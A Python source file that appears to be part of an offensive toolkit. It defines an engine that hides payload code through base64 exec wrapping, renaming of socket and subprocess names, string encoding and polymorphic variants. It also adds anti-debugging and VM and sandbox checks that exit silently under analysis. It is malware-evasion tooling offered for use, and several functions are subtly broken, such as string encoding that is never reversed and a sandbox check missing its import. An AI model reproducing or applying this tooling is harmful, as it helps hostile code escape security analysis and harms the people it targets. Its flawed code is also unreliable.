import base64
import random
import string
from typing import Dict, List

class ObfuscationEngine:
    def __init__(self):
        self.techniques = [
            "base64",
            "variable_rename",
            "string_encryption",
            "control_flow",
            "dead_code",
            "encoding_chain"
        ]
    
    async def obfuscate(
        self, 
        code: str, 
        techniques: List[str],
        language: str = "python"
    ) -> Dict:
        """Apply multiple obfuscation techniques"""
        obfuscated = code
        applied = []
        
        for technique in techniques:
            if technique == "base64" and language == "python":
                obfuscated = self._base64_obfuscate(obfuscated)
                applied.append("base64")
            
            elif technique == "variable_rename":
                obfuscated = self._rename_variables(obfuscated)
                applied.append("variable_rename")
            
            elif technique == "string_encryption":
                obfuscated = self._encrypt_strings(obfuscated)
                applied.append("string_encryption")
            
            elif technique == "control_flow":
                obfuscated = self._obfuscate_control_flow(obfuscated)
                applied.append("control_flow")
            
            elif technique == "dead_code":
                obfuscated = self._inject_dead_code(obfuscated)
                applied.append("dead_code")
        
        return {
            "original_size": len(code),
            "obfuscated_size": len(obfuscated),
            "obfuscated_code": obfuscated,
            "techniques_applied": applied
        }
    
    def _base64_obfuscate(self, code: str) -> str:
        """Base64 encoding with exec"""
        encoded = base64.b64encode(code.encode()).decode()
        return f'import base64;exec(base64.b64decode("{encoded}").decode())'
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables to random strings"""
        common_vars = ["socket", "subprocess", "os", "sys", "connect", "send", "recv"]
        
        for var in common_vars:
            random_name = ''.join(random.choices(string.ascii_letters, k=8))
            code = code.replace(var, random_name)
        
        return code
    
    def _encrypt_strings(self, code: str) -> str:
        """XOR encrypt strings"""
        # Simple XOR encryption
        key = random.randint(1, 255)
        
        # Find strings and encrypt them
        import re
        strings = re.findall(r'"([^"]*)"', code)
        
        for s in strings:
            encrypted = ''.join(chr(ord(c) ^ key) for c in s)
            encrypted_hex = encrypted.encode().hex()
            code = code.replace(f'"{s}"', f'bytes.fromhex("{encrypted_hex}").decode()')
        
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        """Add control flow obfuscation"""
        # Add dummy if statements
        obfuscated = f'''
if {random.randint(1,10)} > 0:
    {code}
else:
    pass
'''
        return obfuscated
    
    def _inject_dead_code(self, code: str) -> str:
        """Inject dead code that never executes"""
        dead_code = f'''
# Dead code injection
if False:
    import random
    x = random.randint(1, 1000)
    y = x * 2
    z = y + x
'''
        return dead_code + "\n" + code
    
    async def polymorphic_generation(self, code: str) -> Dict:
        """Generate polymorphic variant"""
        # Change code structure while maintaining functionality
        variants = []
        
        for i in range(3):
            techniques = random.sample(self.techniques, k=random.randint(2, 4))
            result = await self.obfuscate(code, techniques)
            variants.append(result["obfuscated_code"])
        
        return {
            "original": code,
            "variants": variants,
            "count": len(variants)
        }
    
    async def anti_debugging(self, code: str) -> str:
        """Add anti-debugging checks"""
        anti_debug = '''
import sys
import os

# Check for debugger
if sys.gettrace() is not None:
    sys.exit(0)

# Check for VM
if os.path.exists("/proc/scsi/scsi"):
    with open("/proc/scsi/scsi") as f:
        if "VBOX" in f.read() or "VMware" in f.read():
            sys.exit(0)
'''
        return anti_debug + "\n" + code
    
    async def sandbox_detection(self, code: str) -> str:
        """Add sandbox detection"""
        sandbox_check = '''
import time
import os

# Time-based detection
start = time.time()
time.sleep(2)
if time.time() - start < 1.5:
    sys.exit(0)  # Sandbox detected

# Check for sandbox artifacts
sandbox_files = ["/usr/bin/vboxguest", "/usr/bin/vmware-toolbox-cmd"]
if any(os.path.exists(f) for f in sandbox_files):
    sys.exit(0)
'''
        return sandbox_check + "\n" + code

obfuscation_engine = ObfuscationEngine()
